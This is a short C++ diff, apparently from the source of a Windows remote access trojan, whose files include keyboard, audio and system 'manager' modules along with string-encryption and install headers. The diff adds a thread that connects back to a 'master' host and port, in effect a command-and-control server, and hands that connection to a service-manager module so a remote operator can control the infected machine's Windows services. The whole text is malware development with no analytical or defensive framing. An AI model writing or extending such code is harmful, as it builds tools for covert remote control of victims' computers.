@@ -8,6 +8,7 @@
 #include "AudioManager.h"
 #include "SystemManager.h"
 #include "KeyboardManager.h"
+#include "ServerManager.h"
 #include "..\StrCry.h"
 #include "until.h"
 #include "install.h"
@@ -318,6 +319,22 @@ void SetHostID(LPCTSTR lpServiceName, LPCTSTR lpHostID)
 	delete pServices;
 
 
+}
+
+
+//服务管理线程
+DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)
+{
+	OutputDebugString("DWORD WINAPI Loop_ServicesManager(SOCKET sRemote)");
+	CClientSocket	socketClient;
+	if (!socketClient.Connect(CKernelManager::m_strMasterHost, CKernelManager::m_nMasterPort))
+		return -1;
+
+	CServerManager	manager(&socketClient);
+
+	socketClient.run_event_loop();
+
+	return 0;
 }
 
 
